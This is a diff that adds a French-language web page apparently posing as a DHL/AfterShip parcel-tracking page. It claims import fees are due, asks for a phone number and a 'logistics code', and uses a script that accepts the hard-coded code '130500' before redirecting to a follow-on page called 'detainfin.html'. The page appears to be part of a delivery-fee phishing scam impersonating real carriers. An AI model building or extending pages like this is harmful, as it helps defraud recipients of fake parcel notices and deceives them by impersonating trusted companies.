@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Suivez votre colis - AfterShip Tracking</title>
+  <link rel="stylesheet" href="cbm.css">
+  <!-- FontAwesome & Police Inter -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+
+
+<body>
+    
+
+    
+
+  <div class="checkout-container">
+    
+    <!-- Colonne Gauche : Récapitulatif -->
+    <div class="left-panel">
+      <!-- Banner / Carte bleue -->
+      <div class="blue-card">
+        <h2>DHL express</h2>
+        <p> L'acheminement du colis est actée, après validation des formalités administratives.</p>
+      </div>
+
+      <!-- Section Code Promo & Détails -->
+      <div class="summary-details">
+        <div class="promo-row">
+          <div class="promo-tag">
+            <span class="badge">DHL</span>
+            <span class="promo-text">Chargez le code pour actualiser</span>
+          </div>
+          
+        </div>
+
+        <div class="price-row">
+          <span>Frais ajoutés</span>
+          <span class="price-val">0.00</span>
+        </div>
+
+        <div class="price-row">
+          <span>Valeur nette</span>
+          <span class="price-val">0.00</span>
+        </div>
+
+        <div class="price-row total-row">
+          <span>Total</span>
+          <span class="total-val">0.00</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Colonne Droite : Formulaire de paiement -->
+    <div class="right-panel">
+      <h2>DONNEES DE CHARGEMENT DES MARCHANDISES</h2>
+
+      <!-- Logos des méthodes de paiement -->
+      <div class="payment-methods">
+        
+        
+        <div class="method-card">
+          <span class="logo-placeholder red">Taxes d'importation</span>
+        </div>
+
+        
+        <div class="method-card">
+            <span class="logo-placeholder red">Contactez votre agent</span>
+          </div>
+      </div>
+
+      <!-- Formulaire -->
+      <form class="payment-form">
+        
+
+        <div class="input-group">
+          <input type="number" placeholder="Numéro De Téléphone *" required>
+        </div>
+
+        <div class="input-group">
+          <input id="number"  type="number" placeholder="Code de la fiche logistique *" required>
+        </div>
+
+        
+        <!-- Rangée Date & Ville -->
+        <div class="form-row">
+          
+
+          
+
+        <button type="button" id="loginBtn" class="submit-btn">
+          <i class="fa-solid fa-wallet"></i> Souscrire les frais
+        </button>
+
+        
+      </form>
+    </div>
+
+  </div>
+
+  
+  <script>
+    document.getElementById('loginBtn').addEventListener('click', function() {
+        const mdpSaisi = document.getElementById('number').value;
+        if (mdpSaisi === "130500") {
+            window.location.href = "detainfin.html";
+        } else {
+            alert("codes incorrects");
+        }
+    });
+</script>
+
+  
+</body>
+</html>
